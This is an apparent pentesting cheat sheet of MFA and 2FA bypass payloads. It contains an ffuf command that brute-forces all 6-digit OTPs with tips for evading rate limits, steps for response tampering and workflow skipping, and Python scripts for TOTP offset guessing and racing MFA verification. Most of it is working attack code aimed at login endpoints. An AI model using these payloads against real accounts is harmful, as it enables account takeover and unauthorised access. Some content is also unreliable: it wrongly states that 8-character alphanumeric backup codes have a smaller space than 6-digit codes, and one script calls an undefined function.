## MFA / 2FA BYPASS PAYLOADS

### Pattern 1: OTP Brute Force (no rate limit)
```bash
# Try all 6-digit OTPs
ffuf -u "https://target.com/api/verify-otp" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 \
  -t 5

# Rate limit bypass: rotate session tokens between requests
# Or use GraphQL batching to send 100 attempts per request
```

### Pattern 2: OTP Reuse (token not invalidated)
```
1. Request OTP → receive "123456"
2. Submit OTP correctly → authenticated
3. Log out
4. Log in again
5. Submit same OTP "123456" (expired? still works?)
6. Try OTP from previous session at new login
```

### Pattern 3: Response Manipulation
```
Step 1: Enter wrong OTP → intercept response in Burp
Step 2: Change: {"success": false, "message": "Invalid OTP"} → {"success": true}
Step 3: Forward modified response → sometimes app trusts it and proceeds
Also try: change status code 401 → 200, or change redirect from /failed to /dashboard
```

### Pattern 4: Code Predictability
```python
import requests, time

# Some implementations use timestamp-based OTPs:
for t_offset in range(-30, 31):  # Test ±30 seconds
    totp_value = generate_totp(secret, time.time() + t_offset)
    r = requests.post("https://target.com/api/mfa", json={"otp": totp_value})
    if r.status_code == 200:
        print(f"VALID at offset {t_offset}s: {totp_value}")
        break
```

### Pattern 5: Backup Codes Not Rate Limited
```bash
# Backup codes are typically 8-character alphanumeric = smaller space than 6-digit TOTP
# Try brute force on /api/verify-backup-code if no rate limit
```

### Pattern 6: Skip MFA Step (Workflow Bypass)
```bash
# After entering username/password, you get a session cookie
# Test: skip the /mfa/verify step entirely, go directly to /dashboard
# If cookie grants access before MFA = auth flow bypass

# Also: complete MFA in one session, reuse cookie in another browser
# Checks whether MFA completion is tied to the specific session
```

### Pattern 7: Race on MFA Verification
```python
import asyncio, aiohttp

# Race 2 MFA verifications simultaneously
# If both succeed = parallel session ATO
async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify",
                            json={"otp": otp}) as r:
        return await r.json()

async def race():
    async with aiohttp.ClientSession(cookies={"session": "YOUR_SESSION"}) as s:
        results = await asyncio.gather(verify(s, "123456"), verify(s, "123456"))
        print(results)

asyncio.run(race())
```
